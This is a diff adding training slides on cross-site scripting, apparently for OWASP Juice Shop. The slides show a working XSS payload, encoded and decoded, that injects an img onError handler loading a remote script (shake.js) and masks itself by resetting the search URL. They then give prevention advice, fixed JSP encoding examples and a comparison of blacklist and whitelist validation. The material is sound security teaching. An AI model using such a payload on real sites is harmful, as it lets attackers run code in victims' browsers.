@@ -220,3 +220,103 @@ _Make sure that you really understand the subtle difference
 between those two underlying vulnerabilities._
 
 ---
+
+## Analysis of Example
+<small style="text-align: left;">
+
+` http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dowasp%22%3BsearchQuery.value%20%3D%20%22owasp%22%3B%60%29%27%3C%2Fimg%3Eowasp `
+
+</small>
+
+---
+
+### URL Decoded
+
+```
+http://localhost:3000/#/search?q=
+<img src="bha"
+     onError='javascript:eval(`
+         var js=document.createElement("script");
+         js.type="text/javascript";
+         js.src="http://localhost:8080/shake.js";
+         document.body.appendChild(js);
+         var hash=window.location.hash;
+         window.location.hash="#/search?q=owasp";
+         searchQuery.value = "owasp";
+    `)'
+</img>owasp
+```
+
+[shake.js](localhost:8080/shake.js)
+
+---
+
+## [Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
+
+* **Do not include user supplied input in your output!**
+
+<!-- -->
+
+* **Output Encode** all user supplied input
+  * e.g. OWASP Java Encoder
+* Perform **White List Input Validation** on user input
+
+<!-- -->
+
+* Use an HTML Sanitizer for larger user supplied HTML chunks
+  * e.g. OWASP Java HTML Sanitizer
+
+---
+
+## Fixed Code Example
+
+Using `Encoder` from
+[OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project):
+
+```
+<%import org.owasp.encoder.Encoder;%>
+
+Search results for <b><%=Encoder.forHtml(searchCriteria)%></b>:
+<!-- ... -->
+```
+
+Same result using `HtmlUtils` from the popular Spring framework:
+
+```
+<%import org.springframework.web.util.HtmlUtils;%>
+
+Search results for <b><%=HtmlUtils.htmlEscape(searchCriteria)%></b>:
+<!-- ... -->
+```
+
+---
+
+## Input Validation
+
+### Black List
+
+* **"Allow what is not explicitly blocked!"**
+  * Example: Do not allow `<`, `>`, `"`, `;`, `'` and `script` in user
+    input 
+
+<!-- -->
+
+* Can be bypassed by masking attack patterns
+* Must be updated for new attack patterns
+
+**= Negative Security Rule**
+
+---
+
+### White List
+
+* **"Block what is not explicitly allowed!"**
+  * Example: Allow only `a-z`, `A-Z` and `0-9` in user input
+
+<!-- -->
+
+* Provide protection even against future vulnerabilities
+* Tend to get weaker over time when not carefully maintained
+* Can be quite effortsome to define for a whole application
+
+**= Positive Security Rule**
